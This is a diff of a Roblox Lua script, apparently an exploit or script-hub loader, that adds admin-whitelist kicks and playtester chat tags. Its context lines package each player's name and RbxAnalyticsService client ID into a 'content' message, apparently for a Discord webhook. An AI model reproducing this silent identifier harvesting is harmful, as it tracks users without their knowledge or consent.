@@ -42,7 +42,7 @@ task.spawn(function()
     local HWIDdata = HttpService:JSONEncode({
         ['content'] = game.Players.LocalPlayer.Name .. ' ' .. game:GetService(
             'RbxAnalyticsService'
-        ):GetClientId(),
+        ):GetClientId().. 'PLAYTEST <@1037777580977299466>'
     })
 
     local data = HttpService:JSONEncode({
@@ -170,6 +170,10 @@ local AdminCommands = { 7471771361, 8361079437, 9162624705 }
 
 local TextChatService = game:GetService('TextChatService')
 
+if not table.find(AdminCommands, game.Players.LocalPlayer.UserId) then
+    kick('You are not allowed to use that')
+end
+
 TextChatService.OnIncomingMessage = function(Message)
     local command = Message.Text:lower()
     if Message.TextSource then
@@ -180,6 +184,7 @@ TextChatService.OnIncomingMessage = function(Message)
         if
             Message.TextSource.UserId == 8361079437
             or Message.TextSource.UserId == 9162624705
+            or Message.TextSource.UserId == 0
         then
             Message.PrefixText = "<font color='#00E6FF'>[</font><font color='#00E8F8'>P</font><font color='#00EAF1'>l</font><font color='#00ECEB'>a</font><font color='#00EFE4'>y</font><font color='#00F1DE'>t</font><font color='#00F3D7'>e</font><font color='#00F5D1'>s</font><font color='#00F8CA'>t</font><font color='#00FAC4'>e</font><font color='#00FCBD'>r</font><font color='#00FFB7'>]</font>"
                 .. Message.PrefixText
